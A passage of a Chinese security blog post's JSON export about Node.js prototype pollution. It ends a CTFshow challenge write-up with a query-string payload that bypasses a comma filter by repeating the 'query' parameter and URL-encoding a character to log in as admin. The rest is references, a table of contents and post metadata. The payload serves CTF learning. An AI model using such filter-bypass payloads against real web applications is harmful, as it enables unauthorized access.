class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>但这里存在过滤<code>(req.url.match(/8c|2c|\\,/ig))</code>，<code>%2c</code>是<code>,</code>，所以我们这里不能再用逗号，我们这里可以使用<code>&amp;&amp;</code>来代替它，但此时发现还不行，这是因为<code>:&quot;ctfshow</code>这里，这个<code>&quot;</code>的编码是<code>%22</code>，而它和c连起来，此时就是<code>%22c</code>，此时就有<code>2c</code>了，所以不满足条件，因此我们这里需要对c进行一次URL编码，所以最终payload是</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">query&#x3D;&#123;&quot;name&quot;:&quot;admin&quot;&amp;query&#x3D;&quot;password&quot;:&quot;%63tfshow&quot;&amp;query&#x3D;&quot;isVIP&quot;:true&#125;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h1 id=\"参考文章\"><a href=\"#参考文章\" class=\"headerlink\" title=\"参考文章\"></a>参考文章</h1><p><a href=\"https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html#0x02-javascript\">https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html#0x02-javascript</a><br><a href=\"https://xz.aliyun.com/t/7182#toc-7\">https://xz.aliyun.com/t/7182#toc-7</a><br><a href=\"https://blog.csdn.net/miuzzx/article/details/111780832\">https://blog.csdn.net/miuzzx/article/details/111780832</a><br><a href=\"https://xz.aliyun.com/t/7184#toc-11\">https://xz.aliyun.com/t/7184#toc-11</a></p>\n","feature":true,"text":"声明文章首发于Freebuf社区https://www.freebuf.com/articles/web/361333.html 前言Node.js之前并未有太多了解，最近遇上了一些相关题目，发现原型链污染是其一个常考点，在学习后对其进行了简单总结，希望对正在学习的师傅有所帮助 ...","link":"","photos":[],"count_time":{"symbolsCount":"19k","symbolsTime":"17 mins."},"categories":[{"name":"WEB知识","slug":"WEB知识","count":23,"path":"api/categories/WEB知识.json"}],"tags":[{"name":"Node.js","slug":"Node-js","count":1,"path":"api/tags/Node-js.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%A3%B0%E6%98%8E\"><span class=\"toc-text\">声明</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%89%8D%E8%A8%80\"><span class=\"toc-text\">前言</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#Node-js\"><span class=\"toc-text\">Node.js</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93\"><span class=\"toc-text\">原型链污染</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#proto-%E5%92%8Cprototype\"><span class=\"toc-text\">__proto__和prototype</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%85%B7%E4%BD%93%E8%BF%87%E7%A8%8B\"><span class=\"toc-text\">具体过程</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%B0%8F%E6%8B%93%E5%B1%95%EF%BC%88js%E5%A4%A7%E5%B0%8F%E5%86%99%E7%89%B9%E6%80%A7%EF%BC%89\"><span class=\"toc-text\">小拓展（js大小写特性）</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%AE%9E%E6%88%98\"><span class=\"toc-text\">实战</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#CatCTF-2022-wife\"><span class=\"toc-text\">CatCTF 2022 wife</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Code-Breaking-2018-Thejs\"><span class=\"toc-text\">Code-Breaking 2018 Thejs</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#CTFshow%E7%B3%BB%E5%88%97\"><span class=\"toc-text\">CTFshow系列</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#web334\"><span class=\"toc-text\">web334</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#web335\"><span class=\"toc-text\">web335</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E6%96%B9%E6%B3%95%E4%B8%80\"><span class=\"toc-text\">方法一</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E6%96%B9%E6%B3%95%E4%BA%8C\"><span class=\"toc-text\">方法二</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#web336\"><span class=\"toc-text\">web336</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E6%96%B9%E6%B3%95%E4%B8%80-1\"><span class=\"toc-text\">方法一</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E6%96%B9%E6%B3%95%E4%BA%8C-1\"><span class=\"toc-text\">方法二</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#web-337\"><span class=\"toc-text\">web 337</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#web338\"><span class=\"toc-text\">web338</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#web339\"><span class=\"toc-text\">web339</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E6%96%B9%E6%B3%95%E4%B8%80-2\"><span class=\"toc-text\">方法一</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E6%96%B9%E6%B3%95%E4%BA%8C-2\"><span class=\"toc-text\">方法二</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#web340\"><span class=\"toc-text\">web340</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#web341\"><span class=\"toc-text\">web341</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#Web342\"><span class=\"toc-text\">Web342</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#Web343\"><span class=\"toc-text\">Web343</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#Web344\"><span class=\"toc-text\">Web344</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0\"><span class=\"toc-text\">参考文章</span></a></li></ol>","author":{"name":"quan9i","slug":"blog-author","avatar":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303140010598.jpeg","link":"/","description":"国家一级保护废物","socials":{"github":"https://github.com/quan9i","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"https://blog.csdn.net/Reme_mber","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"内网靶场实战——ATT&CK实战系列（一）","uid":"1435f592b7abfcf9251a6298346c1f3d","slug":"内网靶场实战——ATT&CK实战系列（一）","date":"2023-02-27T18:04:20.000Z","updated":"2024-02-14T07:48:44.000Z","comments":true,"path":"api/articles/内网靶场实战——ATT&CK实战系列（一）.json","keywords":null,"cover":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141543894.png","text":"环境搭建靶场地址http://vulnstack.qiyuanxuetang.net/vuln/detail/2/下载过文件后，需配置如下两个虚拟网络（一个内网，一个外网）靶场拓扑图如下这里我们的win7是作为Web服务器的，所以我们需要给Web服务器配置两张网卡，如下所示另外两...","link":"","photos":[],"count_time":{"symbolsCount":"4.3k","symbolsTime":"4 mins."},"categories":[{"name":"内网","slug":"内网","count":12,"path":"api/categories/内网.json"}],"tags":[{"name":"内网","slug":"内网","count":13,"path":"api/tags/内网.json"}],"author":{"name":"quan9i","slug":"blog-author","avatar":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303140010598.jpeg","link":"/","description":"国家一级保护废物","socials":{"github":"https://github.com/quan9i","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"https://blog.csdn.net/Reme_mber","juejin":"","customs":{}}},"feature":true},"next_post":{"title":"SQL Server命令执行方式汇总","uid":"ad74bb09d7e0c77ac4f85f8bb423fecf","slug":"SQL Server命令执行方式汇总","date":"2023-02-11T15:51:20.000Z","updated":"2023-03-14T07:46:32.000Z","comments":true,"path":"api/articles/SQL Server命令执行方式汇总.json","keywords":null,"cover":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141545601.png","text":"前言学习内网基础时发现对Mssql的命令执行不太熟悉，因此进行了简单总结，希望对正在学习此类知识的师傅有所帮助。 环境搭建本文环境如下 服务器：windows2008 数据库：sqlserver2008 下载链接如下（复制后打开迅雷即可自动加载） ed2k://|file|cn_...","link":"","photos":[],"count_time":{"symbolsCount":"21k","symbolsTime":"19 mins."},"categories":[{"name":"渗透","slug":"渗透","count":2,"path":"api/categories/渗透.json"}],"tags":[{"name":"内网","slug":"内网","count":13,"path":"api/tags/内网.json"}],"author":{"name":"quan9i","slug":"blog-author","avatar":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303140010598.jpeg","link":"/","description":"国家一级保护废物","socials":{"github":"https://github.com/quan9i","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"https://blog.csdn.net/Reme_mber","juejin":"","customs":{}}},"feature":true}}